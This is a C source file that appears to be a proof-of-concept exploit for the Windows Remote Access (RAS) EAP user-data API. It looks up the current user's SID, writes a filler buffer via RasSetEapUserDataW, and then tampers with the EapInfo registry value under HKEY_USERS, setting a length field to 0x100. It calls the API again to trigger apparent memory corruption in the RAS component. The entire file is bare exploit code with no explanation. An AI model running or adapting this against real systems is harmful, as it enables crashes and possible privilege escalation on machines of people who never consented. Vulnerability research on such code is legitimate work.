#include <stdio.h>
#include <string.h>
#include "windows.h"
#include <Ras.h>
#pragma comment(lib, "rasapi32.lib")
#pragma comment(lib, "Rasdlg.lib")
#pragma warning (disable: 4996)

#define MAX_NAME 260


int main()
{
	
	HKEY   valueKeyW;
	DWORD   DePositionValue= REG_OPENED_EXISTING_KEY;

	char userName[MAX_NAME] = "";
	char sid[MAX_NAME] = "";
	DWORD nameSize = sizeof(userName);
	GetUserNameA((LPSTR)userName, &nameSize);


	char userSID[MAX_NAME] = "";
	char userDomain[MAX_NAME] = "";
	DWORD sidSize = sizeof(userSID);
	DWORD domainSize = sizeof(userDomain);


	SID_NAME_USE snu;
	LookupAccountNameA(NULL,
		(LPSTR)userName,
		(PSID)userSID,
		&sidSize,
		(LPSTR)userDomain,
		&domainSize,
		&snu);


	PSID_IDENTIFIER_AUTHORITY psia = GetSidIdentifierAuthority(userSID);
	sidSize = sprintf(sid, "S-%lu-", SID_REVISION);
	sidSize += sprintf(sid + strlen(sid), "%-lu", psia->Value[5]);


	int i = 0;
	int subAuthorities = *GetSidSubAuthorityCount(userSID);


	for (i = 0; i < subAuthorities; i++)
	{
		sidSize += sprintf(sid + sidSize, "-%lu", *GetSidSubAuthority(userSID, i));
	}

	BYTE* buf = (BYTE*)malloc(0x10);

	memset(buf, 0x41, 0x10);

	RasSetEapUserDataW(0, L"1.pbk", L"test", buf, 0x10);

	strcat(sid, "\\SOFTWARE\\Microsoft\\RAS EAP\\UserEapInfo");

	if (ERROR_SUCCESS == RegCreateKeyExA(HKEY_USERS, sid, 0, 0,0,KEY_ALL_ACCESS,0, &valueKeyW,0))
	{
		ULONG dw = 0x30;
		CHAR lpData[0x30];
	    RegGetValueA(valueKeyW, 0,"EapInfo", REG_BINARY,0, lpData, &dw);
		*(DWORD*)((CHAR*)lpData + 0x18) = 0x100;
		RegSetValueExW(valueKeyW, L"EapInfo", 0, REG_BINARY, (BYTE*)lpData, 0x30);
	}
	else
	{
		printf("Failed to open the registry  \n ");
		exit(-1);
	}

	memset(buf, 0x41, 0x10);

	printf("RasSetEapUserDataW call  \n ");

    RasSetEapUserDataW(0, L"c:\\Users\\ztl\\Desktop\\1.pbk", L"test", buf, 0x10);
	system("pause");

	return 0;
}




